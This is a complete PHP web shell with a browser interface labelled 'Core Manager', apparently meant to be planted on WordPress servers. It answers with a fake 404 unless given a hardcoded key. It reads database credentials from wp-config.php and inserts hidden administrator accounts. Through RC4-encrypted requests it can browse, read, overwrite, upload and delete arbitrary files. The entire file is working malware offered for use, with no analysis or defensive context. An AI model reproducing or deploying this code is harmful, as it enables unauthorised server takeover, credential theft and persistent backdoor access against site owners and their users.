<?php
@session_start();
error_reporting(0);
set_time_limit(0);

$k = "admin888"; 

if (isset($_GET['root']) && $_GET['root'] === $k && isset($_GET['wpuser'])) {
    $un = explode('|', $_GET['wpuser']);
    $pw = $_GET['wppass'] ?? "admin888";
    header('Content-Type: text/plain');
    die(ax($un, $pw));
}

if (!isset($_SESSION['sh_auth'])) {
    if (isset($_GET['root']) && $_GET['root'] === $k) {
        if (isset($_POST['p']) && $_POST['p'] === $k) { $_SESSION['sh_auth'] = 1; }
        else { die('<form method="POST" style="text-align:center;padding:100px;">Key: <input type="password" name="p"><input type="submit"></form>'); }
    } else { header('HTTP/1.1 404 Not Found'); die(); }
}

function rc4($d, $k) {
    $s = array(); for ($i = 0; $i < 256; $i++) $s[$i] = $i;
    $j = 0; for ($i = 0; $i < 256; $i++) {
        $j = ($j + $s[$i] + ord($k[$i % strlen($k)])) % 256;
        $x = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $x;
    }
    $i = $j = 0; $res = '';
    for ($y = 0; $y < strlen($d); $y++) {
        $i = ($i + 1) % 256; $j = ($j + $s[$i]) % 256;
        $x = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $x;
        $res .= $d[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
    }
    return $res;
}

function ax($u, $p) {
    $pts = [getcwd(), $_SERVER['DOCUMENT_ROOT'], dirname($_SERVER['DOCUMENT_ROOT'])];
    $out = [];
    foreach (array_unique($pts) as $d) {
        $f = $d . '/wp-config.php';
        if (@file_exists($f)) {
            $c = @file_get_contents($f);
            preg_match("/'DB_NAME'\s*,\s*'(.*?)'/", $c, $db);
            preg_match("/'DB_USER'\s*,\s*'(.*?)'/", $c, $usr);
            preg_match("/'DB_PASSWORD'\s*,\s*'(.*?)'/", $c, $dbpw);
            preg_match("/'DB_HOST'\s*,\s*'(.*?)'/", $c, $hst);
            preg_match("/\\\$table_prefix\s*=\s*'(.*?)'/", $c, $pr);
            $m = @new mysqli($hst[1], $usr[1], $dbpw[1], $db[1]);
            if ($m->connect_error) continue;
            $t_p = $pr[1] ?? 'wp_'; $hp = md5($p);
            foreach ($u as $n) {
                $m->query("REPLACE INTO {$t_p}users (user_login,user_pass,user_nicename,user_email,user_registered,display_name) VALUES ('$n','$hp','$n','u@u.com',NOW(),'$n')");
                $r = $m->query("SELECT ID FROM {$t_p}users WHERE user_login='$n'");
                if($r) {
                    $id = $r->fetch_object()->ID;
                    $m->query("INSERT INTO {$t_p}usermeta (user_id,meta_key,meta_value) VALUES ($id,'{$t_p}capabilities','a:1:{s:13:\"administrator\";b:1;}') ON DUPLICATE KEY UPDATE meta_value='a:1:{s:13:\"administrator\";b:1;}'");
                    $m->query("INSERT INTO {$t_p}usermeta (user_id,meta_key,meta_value) VALUES ($id,'{$t_p}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");
                }
            }
            $m->close(); $out[] = "SUCCESS -> $d";
        }
    }
    return empty($out) ? "Not Found" : implode("\n", $out);
}

if (isset($_POST['z'])) {
    $dec = rc4(hex2bin($_POST['z']), $k);
    $pl = json_decode($dec, true);
    $res = []; $a = $pl['a']; $p = $pl['p'];
    switch($a) {
        case 'ls':
            foreach(@scandir($p) as $f){
                if($f=='.'||$f=='..')continue; $fp = $p.'/'.$f;
                $res['d'][]=['n'=>$f,'t'=>is_dir($fp)?'d':'f','s'=>round(@filesize($fp)/1024,2).'K','p'=>substr(sprintf('%o',@fileperms($fp)),-4)];
            }
            break;
        case 'rd': $res['data'] = @file_get_contents($p); break;
        case 'sv': $res['o'] = @file_put_contents($p, $pl['c']) ? "Saved" : "Fail"; break;
        case 'dl': $res['o'] = @unlink($p) ? "Done" : "Fail"; break;
        case 'up': $res['o'] = @file_put_contents($p, base64_decode($pl['c'])) ? "Upload Success" : "Upload Fail"; break;
        case 'ix': $res['o'] = ax($pl['u'], $pl['pw']); break;
    }
    die(bin2hex(rc4(json_encode($res), $k)));
}
?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Core Manager</title>
<style>
    body{background:#f0f2f5;font:12px Arial;padding:15px}
    .box{background:#fff;border:1px solid #ccc;padding:15px;box-shadow:0 1px 3px rgba(0,0,0,0.1)}
    .i{display:flex;padding:6px;border-bottom:1px solid #f3f4f6;cursor:pointer;align-items:center}
    .i:hover{background:#f9fafb}
    .btn{background:#0073aa;color:#fff;border:none;padding:6px 12px;cursor:pointer;border-radius:3px;font-weight:bold}
    textarea{width:100%;height:450px;margin-top:10px;display:none;font-family:monospace}
</style></head>
<body>
<div class="box">
    <div style="margin-bottom:10px;"><b>CWD:</b> <span id="cwd"></span></div>
    <div style="margin-bottom:15px; display:flex; gap:10px;">
        <button class="btn" onclick="nav('..')">UP</button>
        <button class="btn" style="background:#46b450" onclick="document.getElementById('f').click()">UPLOAD FILE</button>
        <button class="btn" style="background:#d63638" onclick="ix()">WP INJECT</button>
        <input type="file" id="f" style="display:none" onchange="up(this)">
    </div>
    <div id="list"></div>
    <div id="eb" style="display:none">
        <textarea id="editor"></textarea><br>
        <button class="btn" onclick="sv()">SAVE</button> <button class="btn" style="background:#666" onclick="hd()">CLOSE</button>
    </div>
</div>
<script>
let k="<?=$k?>",cur="<?=addslashes(getcwd())?>",af="";
const hx={e:s=>s.split('').map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(''),d:h=>h.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('')};
function r4(d,k){let s=[],j=0,x,r='';for(let i=0;i<256;i++)s[i]=i;for(let i=0;i<256;i++){j=(j+s[i]+k.charCodeAt(i%k.length))%256;x=s[i];s[i]=s[j];s[j]=x;}let i=0,m=0;for(let y=0;y<d.length;y++){i=(i+1)%256;m=(m+s[i])%256;x=s[i];s[i]=s[m];s[m]=x;r+=String.fromCharCode(d.charCodeAt(y)^s[(s[i]+s[m])%256]);}return r;}
async function api(o){
    let fd=new FormData();fd.append('z',hx.e(r4(JSON.stringify(o),k)));
    let r=await fetch('',{method:'POST',body:fd});
    let t=await r.text(); return JSON.parse(r4(hx.d(t),k));
}
function ld(p){
    cur=p;document.getElementById('cwd').innerText=p;
    api({a:'ls',p:p}).then(res=>{
        let h=""; res.d.sort((a,b)=>a.t=='d'?-1:1).forEach(i=>{
            h+=`<div class="i"><div style="flex:1" onclick="hl('${i.n}','${i.t}')">${i.t=='d'?'[DIR]':'[OBJ]'} ${i.n}</div><div style="width:70px;color:#999">${i.s}</div><div style="width:40px;color:#d63638;font-weight:bold" onclick="dl('${p+'/'+i.n}')">DEL</div></div>`;
        });
        document.getElementById('list').innerHTML=h; hd();
    });
}
function hl(n,t){
    let p=cur+(cur.includes('/')?'/':'\\')+n;
    if(t=='d')ld(p);
    else{af=p;api({a:'rd',p:p}).then(r=>{document.getElementById('editor').value=r.data;document.getElementById('editor').style.display='block';document.getElementById('eb').style.display='block';document.getElementById('list').style.display='none';});}
}
function up(i){
    let f=i.files[0]; if(!f) return;
    let r=new FileReader();
    r.onload=function(e){
        api({a:'up',p:cur+'/'+f.name,c:btoa(e.target.result)}).then(res=>{alert(res.o);ld(cur);});
    };
    r.readAsBinaryString(f);
}
function ix(){
    let u=prompt("Users (split by |)", "adminlin|admin_lin");
    let p=prompt("Password", "admin888");
    if(u&&p) api({a:'ix',p:'',u:u.split('|'),pw:p}).then(r=>alert(r.o));
}
function sv(){api({a:'sv',p:af,c:document.getElementById('editor').value}).then(r=>alert(r.o));}
function dl(p){if(confirm('Delete?'))api({a:'dl',p:p}).then(r=>{alert(r.o);ld(cur);});}
function hd(){document.getElementById('editor').style.display='none';document.getElementById('eb').style.display='none';document.getElementById('list').style.display='block';}
function nav(d){let s=cur.includes('/')?'/':'\\';let p=cur.split(s);if(d=='..')p.pop();ld(p.join(s)||s);}
ld(cur);
</script></body></html>
